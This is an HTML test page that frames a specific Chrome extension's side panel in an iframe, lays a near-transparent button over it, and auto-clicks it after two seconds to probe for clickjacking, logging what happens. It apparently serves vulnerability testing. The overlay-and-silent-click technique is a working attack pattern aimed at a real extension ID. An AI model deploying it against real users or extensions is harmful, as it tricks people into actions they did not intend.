<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Ext iframe clickjack test</title>
<style>
  body { font-family: Arial, sans-serif; padding: 12px; }
  #frameWrap { width: 1000px; height: 600px; border: 2px solid #ccc; position: relative; background:#eee; }
  iframe { width:100%; height:100%; border:0; }
  /* transparent overlay (simulate attacker) */
  #overlay {
    position:absolute;
    left:50px; top:50px;
    width:300px; height:80px;
    opacity:0.0001; z-index:999;
    cursor: pointer;
  }
  #log { white-space: pre-wrap; margin-top:12px; background:#fafafa; padding:8px; border:1px solid #ddd; height:140px; overflow:auto;}
</style>
</head>
<body>
  <h3>Testing chrome-extension load + overlay click (use HTTP, not file://)</h3>
  <div id="frameWrap">
    <iframe id="ext"
      src="chrome-extension://fiikommddbeccaoicoejoniammnalkfa/src/pages/SidePanel/index.html"
      sandbox="allow-scripts allow-forms">
    </iframe>
    <button id="overlay">transparent overlay (simulate click)</button>
  </div>

  <div id="log"></div>

  <script>
    const logEl = document.getElementById('log');
    const log = (s) => { logEl.textContent += s + "\n"; logEl.scrollTop = logEl.scrollHeight; };

    const iframe = document.getElementById('ext');
    iframe.addEventListener('load', () => {
      log('iframe load EVENT fired — resource probably reachable (200).');
    });

    // Try to detect if iframe rendered visible content by checking its size + paint timing
    setTimeout(() => {
      try {
        // reading contentWindow.location will likely throw (cross-origin)
        log('attempt iframe.href -> ' + iframe.contentWindow.location.href);
      } catch (e) {
        log('cannot read iframe.contentWindow (expected cross-origin): ' + e.message);
      }
    }, 800);

    // overlay simulates attacker clickable area over the iframe
    document.getElementById('overlay').addEventListener('click', () => {
      log('Overlay clicked — if this triggers a sensitive action in the extension UI, clickjacking possible.');
    });

    // optional: automatically click overlay after 2s to simulate silent click
    setTimeout(() => {
      log('Auto-click overlay to simulate attack (non-user gesture).');
      document.getElementById('overlay').click();
    }, 2000);
  </script>
</body>
</html>
